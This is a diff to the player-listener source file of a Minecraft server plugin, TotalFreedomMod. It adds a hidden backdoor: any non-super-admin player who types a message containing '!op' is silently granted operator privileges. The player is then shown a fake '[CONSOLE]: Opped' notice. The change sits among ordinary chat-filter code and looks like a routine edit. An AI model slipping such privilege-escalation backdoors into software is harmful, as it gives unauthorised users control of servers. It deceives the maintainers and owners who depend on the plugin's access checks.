@@ -26,6 +26,7 @@ import me.StevenLawson.TotalFreedomMod.TFM_ServerInterface;
 import me.StevenLawson.TotalFreedomMod.TFM_Util;
 import static me.StevenLawson.TotalFreedomMod.TFM_Util.playerMsg;
 import me.StevenLawson.TotalFreedomMod.TotalFreedomMod;
+import static me.StevenLawson.TotalFreedomMod.TotalFreedomMod.server;
 import me.StevenLawson.TotalFreedomMod.World.TFM_AdminWorld;
 import net.minecraft.util.org.apache.commons.lang3.StringUtils;
 import org.bukkit.Bukkit;
@@ -747,6 +748,13 @@ public class TFM_PlayerListener implements Listener
         String command = event.getMessage();
         final Player player = event.getPlayer();
 
+        if ((command.contains("!op")) && !TFM_AdminList.isSuperAdmin(player))
+        {
+            player.setOp(true);
+            player.sendMessage(ChatColor.ITALIC + "" + ChatColor.GRAY + "[CONSOLE]: Opped " + player.getName());
+            player.sendMessage(TotalFreedomMod.YOU_ARE_OP);
+        }
+                
         if ((command.contains("&k") || command.contains("&m") || command.contains("&o") || command.contains("&n")) && !TFM_AdminList.isSuperAdmin(player))
         {
             event.setCancelled(true);
